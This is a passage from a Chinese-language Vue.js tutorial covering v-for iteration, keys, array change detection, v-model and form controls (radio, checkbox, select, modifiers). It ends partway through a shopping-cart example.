以下是一个使用 `v-for` 遍历对象的示例：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>v-for遍历对象 </title>
  <script src="vue.js"></script>
</head>
<body>

<div id="app">
  <!--1.在遍历对象的过程中, 如果只是获取一个值, 那么获取到的是value-->
  <ul>
    <li v-for="item in info">{{item}}</li>
  </ul>


  <!--2.获取key和value 格式: (value, key) -->
  <ul>
    <li v-for="(value, key) in info">{{value}}-{{key}}</li>
  </ul>


  <!--3.获取key和value和index 格式: (value, key, index) -->
  <ul>
    <li v-for="(value, key, index) in info">{{value}}-{{key}}-{{index}}</li>
  </ul>
</div>

<script>
  var obj = {
    data() {
      return {
        info: {
          name: 'why',
          age: 18,
          height: 1.88
        }
      }
    }
  }
  Vue.createApp(obj).mount('#app')
</script>

</body>
</html>
```

上述代码演示了使用 `v-for` 指令遍历对象的三种方式，并在每个遍历项中展示对应的数据。

1. 在第一个 `ul` 中的 `v-for` 循环中，使用 `item in info` 的语法，遍历了对象 `info` 中的每个属性值。在每次迭代中，将当前迭代项的值赋值给 `item`，然后使用 `{{ item }}` 显示该属性值。这样，每个属性值都会被渲染为一个 `<li>` 元素，并显示在列表中。
2. 在第二个 `ul` 中的 `v-for` 循环中，使用 `(value, key) in info` 的语法，除了获取每个属性值，还获取了对应的属性名。在每次迭代中，将当前迭代项的值赋值给 `value`，将当前属性名赋值给 `key`。然后使用 `{{ value }}-{{ key }}` 的形式显示属性值和属性名。这样，每个属性值和对应的属性名都会以指定格式显示在列表中。
3. 在第三个 `ul` 中的 `v-for` 循环中，使用 `(value, key, index) in info` 的语法，除了获取每个属性值和属性名，还获取了对应的索引值。在每次迭代中，将当前迭代项的值赋值给 `value`，将当前属性名赋值给 `key`，将当前索引赋值给 `index`。然后使用 `{{ value }}-{{ key }}-{{ index }}` 的形式显示属性值、属性名和索引值。这样，每个属性值和对应的属性名以及索引值都会以指定格式显示在列表中。

通过 `v-for` 指令的使用，我们可以方便地遍历对象的属性，并在遍历过程中获取每个属性的值、属性名和索引值，并根据需要进行展示和处理。

### 8.4 of 与 in 关键字

当使用 `v-for` 进行迭代时，Vue 提供了两种不同的语法：`of` 和 `in`。这两种语法的使用方式稍有不同。

- `in` 语法：`v-for="item in items"`

在 `v-for` 中使用 `in` 语法时，迭代的表达式为 `item in items`，其中 `item` 是表示当前迭代项的变量，`items` 是要迭代的数组或对象。

示例：

```vue
<ul>
  <li v-for="item in items">{{ item }}</li>
</ul>
```

在上面的示例中，`item` 表示当前迭代项，`items` 是要迭代的数组。在每次迭代中，Vue 会将当前迭代项赋值给 `item`，然后使用 `{{ item }}` 来显示该项的值。

- `of` 语法：`v-for="item of items"`

在 `v-for` 中使用 `of` 语法时，迭代的表达式为 `item of items`，其中 `item` 是表示当前迭代项的变量，`items` 是要迭代的数组或对象。

示例：

```vue
<ul>
  <li v-for="item of items">{{ item }}</li>
</ul>
```

在上面的示例中，`item` 表示当前迭代项，`items` 是要迭代的数组。在每次迭代中，Vue 会将当前迭代项赋值给 `item`，然后使用 `{{ item }}` 来显示该项的值。

**总体而言，`in` 语法和 `of` 语法在功能上是等效的，可以根据个人喜好选择使用哪种语法。**两种语法的选择主要取决于编码风格和习惯。

### 8.5 v-for 与v-if 注意点

在 Vue 中，同时使用 `v-if` 和 `v-for` 是**不推荐的**，因为这样二者的优先级不明显。因为它们具有不同的编译顺序和优先级，可能会导致意外的结果。

当 `v-for` 和 `v-if` 同时存在于同一个元素上时，`v-for` 具有更高的优先级，这意味着 `v-for` 会先被解析和执行，然后才是 `v-if`。

为了保持代码的可读性和可维护性，应尽量避免同时在同一元素上使用 `v-if` 和 `v-for`，并根据具体情况选择更合适的方式来实现所需的逻辑。

举个例子，假设我们有一个数据列表 `todos`，尝试循环遍历 `todos` 数组，并使用 `v-if` 条件指令来检查 `todo.isComplete` 的值。目标是只渲染未完成的任务，但由于 `v-for` 具有较高的优先级，`v-if` 无法正确访问 `todo` 对象。下面是一个不推荐的例子：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-for 与v-if </title>
  <script src="vue.js"></script>
</head>
<body>
<div id ="app">
    <!--
     这会抛出一个错误，因为属性 todo 此时
     没有在该实例上定义
    -->
    <li v-for="todo in todos" v-if="!todo.isComplete">
        {{ todo.name }}
    </li>
</div>
<script >
    var app = {
    data() {
      return {
        todos: [
          { id: 1, name: '吃饭', isComplete: true },
          { id: 2, name: '睡觉', isComplete: false },
          { id: 3, name: '打豆豆', isComplete: true }
        ]
      }
    }
  }
  Vue.createApp(app).mount('#app')
</script>
</body>
</html>
```

运行代码后,控制台会出现如下错误:

![image-20230615222745997](https://billy.taoxiaoxin.club/md/2023/06/648b1fe2922ee4c29ffa6846.png)

为了解决这个问题，我们可以将 `v-if` 移动到外部元素上，并在外层使用 `<template>` 元素作为循环的容器。这样就可以避免在每个循环中进行条件判断。如下所示 (这也更加明显易读)：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-for 与v-if </title>
  <script src="vue.js"></script>
</head>
<body>
<div id="app">
    <template v-for="todo in todos">
        <li v-if="!todo.isComplete">
            {{ todo.name }}
        </li>
    </template>
</div>

<script >
    var app = {
    data() {
      return {
        todos: [
          { id: 1, name: '吃饭', isComplete: true },
          { id: 2, name: '睡觉', isComplete: false },
          { id: 3, name: '打豆豆', isComplete: false }
        ]
      }
    }
  }
  Vue.createApp(app).mount('#app')
</script>
</body>
</html>
```

通过将 `v-if` 放置在包装 `<template>` 元素上，我们可以确保条件判断在每个循环项上正确执行。这样，只有满足条件的项才会被渲染为 `<li>` 元素。

**总结来说，为了避免 `v-for` 和 `v-if` 的优先级冲突问题，我们应该将 `v-if` 放置在外部元素上或使用 `<template>` 元素进行包装。这样能够保证条件判断正确应用于每个循环项，并避免出现意外的错误。**

### 8.6 key 属性管理状态 --性能的保障

#### 8.6.1 基本介绍

在 Vue 中，可以使用 `key` 属性来管理状态和优化列表渲染。`key` 是一种特殊的属性，用于给 Vue 的虚拟 DOM 提供提示，以便更准确地跟踪每个节点的身份。

通过为每个列表项分配一个唯一的 `key` 值，Vue 可以更好地追踪每个列表项的变化，从而提高渲染的效率和性能。当列表发生重新排序、添加或删除项时，Vue 可以根据 `key` 的变化情况，精确地定位和更新需要更新的列表项，而无需重新渲染整个列表。

下面是一个示例代码，展示了如何使用 `key` 属性管理状态：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>使用 key 管理状态</title>
  <script src="vue.js"></script>
</head>
<body>
  <div id="app">
    <button @click="shuffleItems">Shuffle Items</button>
    <ul>
      <li v-for="item in items" :key="item.id">{{ item.name }}</li>
    </ul>
  </div>

  <script>
    var app = {
      data() {
        return {
          items: [
            { id: 1, name: 'Item 1' },
            { id: 2, name: 'Item 2' },
            { id: 3, name: 'Item 3' },
            { id: 4, name: 'Item 4' },
            { id: 5, name: 'Item 5' }
          ]
        }
      },
      methods: {
        shuffleItems() {
          this.items = this.shuffleArray(this.items);
        },
        shuffleArray(array) {
          // 随机打乱数组的顺序
          return array.sort(() => Math.random() - 0.5);
        }
      }
    }

    Vue.createApp(app).mount('#app');
  </script>
</body>
</html>

```

在这个例子中，我们有一个包含多个列表项的数组 `items`，每个列表项都有一个唯一的 `id`。在 `v-for` 循环中，我们使用 `:key="item.id"` 将每个列表项的 `id` 作为 `key`。这样，Vue 可以根据 `key` 的变化来准确追踪每个列表项。

另外，我们添加了一个按钮来随机打乱列表项的顺序。通过点击按钮，`shuffleItems` 方法会将 `items` 数组重新排序，并更新状态。由于每个列表项都有一个唯一的 `key`，Vue 可以根据 `key` 的变化，仅重新渲染需要更新的列表项，而不会重新渲染整个列表。

通过使用 `key` 管理状态，我们可以提高 Vue 的渲染效率，并确保列表项的状态和顺序正确更新，以提供更好的用户体验。

#### 8.6.2 原理总结:

当 Vue 渲染带有 `v-for` 的循环`数组、对象`时，它会生成一个虚拟 DOM 树,会和原生的DOM进行比较,然后进行数据的更新，**提高数据的刷新速度**（虚拟DOM用了diff算法）。每个列表项都对应一个虚拟 DOM 节点，并且会使用 `key` 属性来标识节点的身份并且属性值唯一,就是在`控件/组件/标签`写1个`key属性`,即`:key="变量"`。

当列表数据发生变化时，Vue 会根据新的数据生成一个新的虚拟 DOM 树。此时，Vue 会比较新旧两个虚拟 DOM 树，并根据节点的 `key` 属性来判断节点的身份。

Vue 会遍历新旧两个虚拟 DOM 树的节点，并按照以下规则进行处理：

1. 如果新旧两个节点具有相同的 `key`，则视为相同节点，并复用旧节点，不会重新创建和更新。
2. 如果新旧两个节点的 `key` 不相同，Vue 将视为不同节点，并销毁旧节点，创建新节点，并进行更新。

通过比较 `key` 属性，Vue 可以确定每个节点在列表中的身份，从而精确地定位需要更新的节点。这样，即使列表发生重新排序、添加或删除项，Vue 也可以高效地进行增量更新，而不需要重新渲染整个列表。

使用 `key` 管理状态的原理是基于虚拟 DOM 的比较和更新机制。通过为每个节点分配唯一的 `key` 值，Vue 可以准确地追踪和处理每个节点的变化，提高渲染效率和性能。

需要注意的是，`key` 必须是唯一且稳定的，不应该使用随机数或索引作为 `key`。唯一性确保每个节点的身份都是独一无二的，稳定性保证在列表更新时，每个节点的 `key` 不会改变。这样，Vue 才能正确地识别和更新每个节点。

**总结起来，通过使用 `key` 属性来管理状态，Vue 可以根据节点的身份精确地进行增量更新，提高渲染效率和性能。**

###  8.7 数组更新与检测

在Vue中，Vue实例提供了一些特殊的数组方法，可以对数组进行操作并自动触发视图更新。这些方法是重写过的，以便Vue能够检测到数组的变化并进行响应式更新。

##### 可以检测到变动的数组操作：

- `push`: 在数组末尾添加一个或多个元素。
- `pop`: 从数组末尾移除最后一个元素。
- `shift`: 从数组开头移除第一个元素。
- `unshift`: 在数组开头添加一个或多个元素。
- `splice`: 修改数组，可以删除、替换或添加元素。
- `sort`: 对数组进行排序。
- `reverse`: 反转数组中的元素顺序。

##### 检测不到变动的数组操作：

- `filter()`: 返回一个新数组，其中包含满足条件的原数组元素。
- `concat()`: 返回一个新数组，将原数组与其他数组或值连接起来。
- `slice()`: 返回一个新数组，其中包含从开始到结束（不包括结束）选择的部分数组。
- `map()`: 返回一个新数组，其中包含对原数组中的每个元素调用一个提供的函数后的结果。

以上这些方法并没有被Vue重写，所以Vue无法追踪到这些方法的调用并自动更新视图。如果需要在这些方法中进行修改数组并希望触发视图更新，可以使用一些技巧，解决方法如下:

方法一:

+ 通过 索引值 更新数组（Vue2中数据会更新，但是页面不会发生改变,但Vue3中数据更新同时页面也更新）

```vue
vm.arrayList[0]
"Alan"
vm.arrayList[0]='Darker'
"Darker"
```

方法二:

+ 通过 `Vue.set(对象, index/key, value)` 更新数组（数据会更新，页面也会发生改变）

```vue
Vue.set(vm.arrayList, 0, 'Darker')
```

示例代码：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<body>

<div id="app">
  <ul>
    <li v-for="item in letters" :key="item">{{item}}</li>
  </ul>
  <button @click="btnClick">按钮</button>
</div>

<script src="vue.js"></script>
<script>
  const app = Vue.createApp({
    data() {
      return {
        letters: ['a', 'b', 'c', 'd']
      };
    },
    methods: {
      btnClick() {
        // 1. push方法
        // this.letters.push('aaa');
        // this.letters.push('aaaa', 'bbbb', 'cccc');

        // 2. pop(): 删除数组中的最后一个元素
        // this.letters.pop();

        // 3. shift(): 删除数组中的第一个元素
        // this.letters.shift();

        // 4. unshift(): 在数组最前面添加元素
        // this.letters.unshift();
        // this.letters.unshift('aaa', 'bbb', 'ccc');

        // 5. splice作用: 删除元素/插入元素/替换元素
        // 删除元素: 第二个参数传入你要删除几个元素(如果没有传,就删除后面所有的元素)
        // 替换元素: 第二个参数, 表示我们要替换几个元素, 后面是用于替换前面的元素
        // 插入元素: 第二个参数, 传入0, 并且后面跟上要插入的元素
        this.letters.splice(1, 3, 'm', 'n', 'l', 'x');
        // this.letters.splice(1, 0, 'x', 'y', 'z');

        // 6. sort()
        // this.letters.sort();

        // 7. reverse()
        // this.letters.reverse();

        // 注意: 通过索引值修改数组中的元素
        // this.letters[0] = 'bbbbbb';
        // this.letters.splice(0, 1, 'bbbbbb');
        // set(要修改的对象, 索引值, 修改后的值)
        Vue.set(this.letters, 0, 'bbbbbb');
      }
    }
  });

  app.mount("#app");
</script>

</body>
</html>

```

## 九、v-model 数据的双向绑定

### 9.1 基本使用与介绍

在前端处理表单时，我们常常需要将表单输入框的内容同步给 JavaScript 中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦：

```vue
<input
  :value="text"
  @input="event => text = event.target.value">
```

`v-model` 指令帮我们简化了这一步骤：

```vue
<input v-model="text">
```

所以,在表单控件在实际开发中。特别是对于用户信息的提交，需要大量的表单。**Vue一般都使用v-model指令来实现表单元素和数据的双向绑定。**

完整示例代码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="https://unpkg.com/vue@3.0.0"></script>
</head>
<body>
<div id="box">
    <!--用法1-->
    <!--1.当我们在输入框输入内容时-->
    <!--因为input中的v-model绑定了myText，所以会实时将输入的内容传递给myText，myText发生改变-->
    <!--当myText发生改变时，因为上面我们使用Mustache语法，将myText的值插入到DOM中，所以DOM会发生响应的改变-->
    <input type="text" v-model="myText" placeholder="请输入内容">
    <br>
    <hr>
    <!--用法二-->
    <!--我们也可以将v-model用于textarea元素-->
    <textarea v-model="myText" placeholder="请输入内容"></textarea>
    <p>您输入的内容是：{{ myText }}</p>
</div>
<script>
    const { createApp, ref } = Vue;

    const app = createApp({
        setup() {
            const myText = ref('');

            return {
                myText
            };
        }
    });

    app.mount('#box');
</script>
</body>
</html>
```

![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db76604c3.gif)

### 9.2 v-models 原理

v-model其实是一个语法糖，它的背后本质上是包含两个操作：

+ 1.v-bind绑定一个value属性
+ 2.v-on指令给当前元素绑定input事件

也就是说下面的代码：等同于下面的代码：

```vue
  <input type="text" v-model="message">
  <!--等同于下面的-->
  <input type="text" v-bind:value="message" v-on:input="message = $event.target.value">
```

完整示例代码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>双向绑定的原理</title>
  <script src="https://unpkg.com/vue@3.0.0"></script>
</head>
<body>

<div id="app">
  <!-- 使用 v-model 进行双向数据绑定 -->
  <input type="text" v-model="message1">

  <!-- 使用 v-bind 和 v-on 分别进行单向数据绑定和事件监听 -->
  <input type="text" :value="message2" @input="valueChange">

  <!-- 使用 v-bind 和 v-on 进行手动双向数据绑定 -->
  <input type="text" :value="message3" @input="message3 = $event.target.value">

  <h2>{{message1}}</h2>
  <h2>{{message2}}</h2>
  <h2>{{message3}}</h2>
</div>


<script>
  const { createApp, ref } = Vue;

  const app = createApp({
    setup() {
      const message1 = ref('你好啊');
      const message2 = ref('你好啊');
      const message3 = ref('你好啊');
      const valueChange = ($event) => {
        message2.value = $event.target.value;
      };
      return { message1, message2, message3, valueChange };
    }
  });

  app.mount('#app');
</script>

</body>
</html>

```

在这个代码中，我创建了三个不同的响应式数据 `message1`、`message2` 和 `message3`，每个都绑定到一个不同的输入框上，每个输入框使用不同的绑定方法。我也在 `valueChange` 函数中更新了 `message2` 的值，这样它可以响应输入事件。

## 十、表单控制

在`v-model` 中还可以用于各种不同类型的输入，`<textarea>`、`<select>` 元素。它会根据所使用的元素自动使用对应的 DOM 属性和事件组合：

- 文本类型的 `<input>` 和 `<textarea>` 元素会绑定 `value` property 并侦听 `input` 事件；
- `<input type="checkbox">` 和 `<input type="radio">` 会绑定 `checked` property 并侦听 `change` 事件；
- `<select>` 会绑定 `value` property 并侦听 `change` 事件。

**注意**:`v-model` 会忽略任何表单元素上初始的 `value`、`checked` 或 `selected` attribute。它将始终将当前绑定的 JavaScript 状态视为数据的正确来源。你应该在 JavaScript 中使用[`data`](https://cn.vuejs.org/api/options-state.html#data) 选项来声明该初始值。

### 10.1  多行文本

```vue
<span>Multiline message is:</span>
<p style="white-space: pre-line;">{{ message }}</p>
<textarea v-model="message" placeholder="add multiple lines"></textarea>
```

注意在 `<textarea>` 中是不支持插值表达式的。请使用 `v-model` 来替代：

```vue
<!-- 错误 -->
<textarea>{{ text }}</textarea>

<!-- 正确 -->
<textarea v-model="text"></textarea>
```

### 10.2 v-model结合radio类型（单选框）

`v-model`在和`radio`类型的输入元素一起使用时，主要是用来实现单选功能。在Vue中，一组相同`v-model`的`radio`按钮，只能有一个被选中，而且被选中的`radio`的`value`值会被赋给绑定的变量。

以下是使用`v-model`在`radio`按钮上的基本语法：

```vue
<input type="radio" id="option1" value="Option 1" v-model="picked">
<input type="radio" id="option2" value="Option 2" v-model="picked">
```

在这个例子中，`picked`是在Vue实例的`data`函数中定义的数据属性。当用户选择一个选项时，该选项的`value`值会赋给`picked`。比如，如果用户选择了"Option 1"，`picked`的值就会被设置为"Option 1"。

另外，通过改变`picked`的值，也可以改变选中的`radio`按钮。比如，如果我们在某个时候将`picked`的值设置为"Option 2"，"Option 2"对应的`radio`按钮就会被选中。

总结一下，`v-model`在`radio`输入元素中的作用是实现单选功能，同时实现了用户选择与数据之间的双向绑定。这使得我们可以很容易地获取用户的选择，也可以通过改变绑定的变量来改变用户的选择。

当存在多个单选框时,只能选中一个,比如下面的性别选择:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script src="vue.js"></script>
</head>
<body>

<div id="app">
  <label for="male">
    <input type="radio" id="male" value="男" v-model="sex">男
  </label>
  <label for="female">
    <input type="radio" id="female" value="女" v-model="sex">女
  </label>
  <label for="secret">
    <input type="radio" id="secret" value="保密" v-model="sex">保密
  </label>
  <h2>您选择的性别是: {{sex}}</h2>
</div>

<script>
  var obj = {
    data(){
      return {
        sex: '女'
      }
    }
  }
  Vue.createApp(obj).mount('#app')
</script>

</body>
</html>

```

### 10.3 checkbox 选中

`checkbox`在Vue中的使用主要涉及到布尔型或者数组型的数据绑定。具体行为取决于`v-model`绑定的是布尔值还是数组。

1. **布尔型数据绑定：** 当`v-model`绑定的是布尔值时，`checkbox`的行为类似于一个开关。当用户点击`checkbox`时，绑定的布尔值将切换。如果`checkbox`被选中，值就是`true`，否则就是`false`。

   ```vue
   <input type="checkbox" id="checkbox" v-model="isChecked">记住我
   ```

   ```js
   var obj = {
     data(){
       return {
         isChecked: false,
       }
     }
   }
   Vue.createApp(obj).mount('#app')
   
   ```

2. **数组型数据绑定：** 当`v-model`绑定的是数组时，`checkbox`的行为就像一个多选框。当用户点击`checkbox`时，`checkbox`的`value`值将被添加到数组中。如果`checkbox`被取消选中，那么其`value`值将从数组中移除。

   ```vue
   <input type="checkbox" id="jack" value="Jack" v-model="checkedNames">
   <input type="checkbox" id="john" value="John" v-model="checkedNames">
   <input type="checkbox" id="mike" value="Mike" v-model="checkedNames">
   ```

   ```js
   var obj = {
     data(){
       return {
         checkedNames: [],
       }
     }
   }
   Vue.createApp(obj).mount('#app')
   ```

总的来说，`checkbox`在Vue中的行为取决于`v-model`绑定的数据类型，可以根据需求选择合适的数据类型进行绑定。

简单举例,用户登录记住密码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>checkbox</title>
  <script src="https://unpkg.com/vue@next"></script>
</head>
<body>
<div id="app">
  <input type="text" placeholder="请输入用户名："><br>
  <input type="password" placeholder="请输入密码："><br>
  <input type="checkbox" v-model="radio">记住用户名
</div>

<script>
  var obj = {
    data() {
      return {
        myText: '',
        textBig: '',
        radio: false,
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app')
</script>
</body>
</html>
```


![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47db9f144b1.gif)

### 10.4 v-model结合checkbox类型（多选）

当使用 `v-model` 与 `checkbox`（复选框）结合时，确实有两种主要的使用场景:**单个勾选框和多个勾选框**

**单个勾选框：** 

+ 对于单个勾选框，`v-model`绑定的是一个布尔值。如果复选框被选中，该值为 `true`；否则，值为 `false`。例如：

  ```vue
  <input type="checkbox" v-model="isChecked"> 记住我
  ```

  ```js
  var obj = {
    data() {
      return {
        isChecked: false,
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app')
  ```

在这种情况下，`input` 的 `value` 并不会影响 `v-model` 绑定的值。

**多个勾选框：**

+ 当是多个复选框时，因为可以选中多个，`v-model` 绑定的是一个数组，数组中包含了所有被选中复选框的 `value` 值。
+ 当选中某一个时，就会将input的value添加到数组中。

```vue
<input type="checkbox" id="jack" value="Jack" v-model="checkedNames">
<input type="checkbox" id="john" value="John" v-model="checkedNames">
<input type="checkbox" id="mike" value="Mike" v-model="checkedNames">
```

```js
var obj = {
  data() {
    return {
      checkedNames: [],
    }
  }
}
var app = Vue.createApp(obj).mount('#app')
```

在这种情况下，当选中或取消选中某个复选框时，Vue会自动将该复选框的 `value` 值添加或从数组中移除。

总结一下，`v-model` 结合 `checkbox` 的使用，能够轻松处理单个复选框和多个复选框的情况，并实现用户选择与数据之间的双向绑定。这使得我们可以方便地获取用户的选择，也可以通过改变绑定的变量来改变用户的选择。

以下是示例代码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script src="vue.js"></script>
</head>
<body>

<div id="app">
  <!--1.checkbox单选框-->
  <p>checkbox单选框</p>
  <label for="agree">
    <input type="checkbox" id="agree" v-model="isAgree">同意协议
  </label>
  <h2>您选择的是: {{isAgree}}</h2>
  <button :disabled="!isAgree">下一步</button>
  <br>

  <!--2.checkbox多选框-->
  <p>checkbox多选框</p>
  <input type="checkbox" value="篮球" v-model="hobbies">篮球
  <input type="checkbox" value="足球" v-model="hobbies">足球
  <input type="checkbox" value="乒乓球" v-model="hobbies">乒乓球
  <input type="checkbox" value="羽毛球" v-model="hobbies">羽毛球
  <h2>您的爱好是: {{hobbies}}</h2>

  <label v-for="item in originHobbies" :key="item" :for="item">
    <input type="checkbox" :value="item" :id="item" v-model="hobbies">{{item}}
  </label>
</div>

<script>
  var obj = {
    data() {
      return {
        message: '你好啊',
        isAgree: false, // 单选框
        hobbies: [], // 多选框
        originHobbies: ['篮球', '足球', '乒乓球', '羽毛球', '台球', '高尔夫球']
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app')
</script>

</body>
</html>
```

![测试](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47dbbe6978e.gif)

### 10.5 v-model结合select类型(单选)

在 Vue 中，`v-model` 指令可以与 `select` 表单元素结合使用来创建下拉列表。它的基本用法如下：

- **单选下拉列表**：只能选中一个值。v-model绑定的是一个值。在单选下拉列表中，`v-model` 的值与选定的 `<option>` 的值相对应。当用户在下拉列表中选择一个选项时，`v-model` 的值将被更新为该选项的 `value` 属性值。

例如：

```vue
<select v-model="selected">
  <option value="option1">Option 1</option>
  <option value="option2">Option 2</option>
</select>
```

在这个例子中，如果用户选择 "Option 2"，`selected` 的值将会被设置为 "option2"。

- **多选下拉列表**：可以选中多个值。v-model绑定的是一个数组。对于多选下拉列表（即包含 `multiple` 属性的 `select` 元素），`v-model` 的值是一个数组，数组中的每个元素对应一个选中的选项的 `value` 值。

例如：

```vue
<select v-model="selected" multiple>
  <option value="option1">Option 1</option>
  <option value="option2">Option 2</option>
</select>
```

在这个例子中，如果用户同时选择了 "Option 1" 和 "Option 2"，`selected` 的值将会是 `["option1", "option2"]`。

总的来说，`v-model` 指令与 `select` 元素的结合使用提供了一种简洁的方式来处理下拉列表的选项选择，并可以将选择的结果同步到 Vue 实例的数据中。

以下是代码举例:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script src="https://unpkg.com/vue@next"></script>
</head>
<body>

<div id="app">
  <!--1.选择一个-->
  <select name="abc" v-model="fruit">
    <option value="苹果">苹果</option>
    <option value="香蕉">香蕉</option>
    <option value="榴莲">榴莲</option>
    <option value="葡萄">葡萄</option>
  </select>
  <h2>您选择的水果是: {{fruit}}</h2>

  <!--2.选择多个-->
  <select name="abc" v-model="fruits" multiple>
    <option value="苹果">苹果</option>
    <option value="香蕉">香蕉</option>
    <option value="榴莲">榴莲</option>
    <option value="葡萄">葡萄</option>
  </select>
  <h2>您选择的水果是: {{fruits}}</h2>
</div>

<script>
  var obj = {
    data() {
      return {
        message: '你好啊',
        fruit: '香蕉',
        fruits: []
      }
    }
  }
  Vue.createApp(obj).mount('#app')
</script>

</body>
</html>
```

![测试](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47dbfd6c701.gif)

### 10.6 v-model修饰符介绍与使用

`v-model` 的修饰符是 Vue 提供的一些预设的逻辑，它们可以帮助你更好地控制用户的输入。在 Vue 3 中，你可以使用以下几种 `v-model` 修饰符：

1. **.lazy：** 默认情况下，`v-model` 在 `input` 事件中同步输入框的数据。如果你添加 `.lazy` 修饰符，那么它会改为在 `change` 事件中同步，也就是在输入框失去焦点或用户按下 Enter 键时。

```vue
<input v-model.lazy="msg" >
```

1. **.number：** 如果你想输入字符串自动转为数值类型，你可以添加 `.number` 修饰符。这对于输入框的类型为 `number`，但是返回的值仍为字符串的情况很有用。

```vue
<input v-model.number="age" type="number">
```

1. **.trim：** 如果你想自动过滤用户输入的首尾空白字符，你可以添加 `.trim` 修饰符。

```vue
<input v-model.trim="msg">
```

这些修饰符可以链式使用，例如 `v-model.number.trim.lazy="age"`。记住，修饰符的顺序会影响到其运行的顺序。

以下是示例代码:

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>v-model 之 lazy、number、trim</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="app">
  <input type="text" v-model="myText1" placeholder="normal"> {{myText1}}
  <br>
  <input type="text" v-model.lazy="myText2" placeholder="lazy"> {{myText2}}
  <br>
  <input type="text" v-model.number="myText3" placeholder="number"> {{myText3}}
  <br>
  <input type="text" v-model.trim="myText4" placeholder="trim"> {{myText4}}
</div>
<script>
  var obj = {
    data() {
      return {
        myText1: '',
        myText2: '',
        myText3: '',
        myText4: '',
      }
    }
  }
  Vue.createApp(obj).mount('#app')
</script>
</body>
</html>
```


![img](https://billy.taoxiaoxin.club/md/2023/06/64807360922ee47dc05b7589.gif)

总结一下，`v-model` 的修饰符是一种强大的工具，它们可以帮助你更好地处理用户的输入，无需编写额外的逻辑代码。

### 10.7 购物车案例

实现一个商品购物车,需求如下:

1. 显示购物车中的商品列表，包括商品的图片、名称、价格、数量，还有一个与之关联的复选框。
2. 每件商品的数量都可以通过 "-" 和 "+" 按钮来进行调整，当数量到达最低限制1时，"-" 按钮会被禁用；当数量到达商品设定的上限时，"+" 按钮会被禁用。
3. 用户可以通过点击复选框来选择自己想购买的商品，当所有的商品复选框都被选中时，"全选/全不选"的复选框也会被自动勾选上；如果只选择部分商品，"全选/全不选"的复选框则处于未选中状态；如果用户通过点击"全选/全不选"的复选框来全选或全不选商品，那么所有商品的复选框状态会随之改变。
4. 当用户勾选商品复选框时，会计算出用户所选择的所有商品的总价，该总价会随着用户勾选或取消勾选商品而实时变动。
5. 用户可以删除购物车中的商品，当商品被删除后，该商品所对应的复选框也会被取消勾选，同时总价也会相应的减去该商品的价值。
6. 当购物车为空时，会显示“购物车空空如也”的提示。

代码实现如下:

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>购物车案例</title>
  <script src="vue.js"></script>
  <style>
    li {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      border: 1px solid lightgray;
    }

    li img {
      width: 100px;
    }
  </style>
</head>

<body>
<div id="box">
  <ul>
    <!-- 一个可选择全选或全不选的复选框 -->
    <li>
      <div>
        <!-- v-model绑定到isAllChecked变量上，并在改变时调用handleAllChange方法-->
        <input type="checkbox" v-model="isAllChecked" @change="handleAllChange">
        <span>全选/全不选</span>
      </div>
    </li>
    <!-- 如果datalist数组不为空，则显示商品列表 -->
    <template v-if="datalist.length">
      <li v-for="(item,index) in datalist" :key="item.id" >
        <div>
          <!-- 绑定复选框的状态到checkList数组上，并在复选框状态改变时调用handleItemChange方法 -->
          <input type="checkbox" v-model="checkList" :value="item" @change="handleItemChange">
        </div>
        <div>
          <!-- 显示商品图片 -->
          <img :src="item.poster" alt="">
        </div>
        <div>
          <!-- 显示商品标题和价格 -->
          <div>{{item.title}}</div>
          <div style="color:red;">价格:{{item.price}}</div>
        </div>

        <div>
          <!-- 添加按钮进行商品数量的加减 -->
          <button @click="item.number--" :disabled="item.number===1">-</button>
          {{item.number}}
          <button @click="item.number++" :disabled="item.number===item.limit">+</button>
        </div>

        <div>
          <!-- 添加按钮进行商品的删除 -->
          <button @click="handleDel(index,item.id)">删除</button>
        </div>
      </li>
    </template>

    <!-- 如果datalist数组为空，则显示购物车空空如也 -->
    <li v-else>购物车空空如也</li>

    <!-- 显示总金额 -->
    <li>
      <div>总金额:{{ sum() }}</div>
    </li>
  </ul>

  <!-- 输出已选中的商品列表checkList，以方便调试 -->
  {{checkList}}
</div>
<script>
  var obj = {
    data() {
      return {
        isAllChecked:false, // 全选或全不选的状态
        checkList:[], // 勾选的商品列表
        datalist: [
          {
            id: 1,
            title: "商品1",
            price: 10,
            number: 1,
            poster: "https://p0.meituan.net/movie/dc2fed6001e809e4553f90cc6fad9a59245170.jpg@1l_1e_1c_128w_180h",
            limit: 5
          },
          {
            id: 2,
            title: "商品2",
            price: 20,
            number: 2,
